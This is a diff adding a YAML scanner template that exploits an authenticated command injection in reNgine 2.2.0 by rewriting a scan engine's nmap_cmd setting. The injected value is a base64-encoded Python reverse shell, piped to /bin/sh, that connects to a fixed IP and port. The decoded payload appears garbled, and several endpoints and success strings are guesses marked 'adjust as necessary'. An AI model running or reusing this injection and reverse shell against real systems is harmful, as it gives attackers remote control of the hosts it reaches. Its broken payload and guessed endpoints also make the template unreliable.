@@ -1,0 +1,55 @@
+id: rengine-command-injection
+
+info:
+  name: reNgine 2.2.0 - Command Injection (Authenticated)
+  author: Caner Tercan
+  severity: high
+  tags: command-injection, authenticated
+  description: |
+    This template exploits a command injection vulnerability in reNgine 2.2.0
+    by modifying the nmap_cmd parameters in the YAML configuration.
+  references:
+    - https://rengine.wiki/
+    - https://github.com/yogeshojha/rengine
+  date: 2024-09-29
+  version: v2.2.0
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"  # Adjust login endpoint as necessary
+    body: "username={{username}}&password={{password}}"  # Provide authentication parameters
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    # Check for successful login response
+    matchers:
+      - type: word
+        words:
+          - "Welcome"  # Adjust based on the actual response for successful login
+        part: body
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/scan-engine"  # Adjust to match the actual endpoint for scan engines
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/scan-engine/update"  # Adjust the endpoint for modifying scan engines
+    body: |
+      nmap_cmd: 'echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2V0LkFfSU5FVCxzLmNvbm5lY3QoIiMTAuMjQ0LjE1MC42OSIsNjE2MTIpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKScg"|base64 --decode |/bin/sh  # Modify this as needed for proper syntax
+
+    headers:
+      Content-Type: application/x-yaml
+
+    matchers:
+      - type: word
+        words:
+          - "Scan started"  # Adjust based on actual success message for starting scan
+        part: body
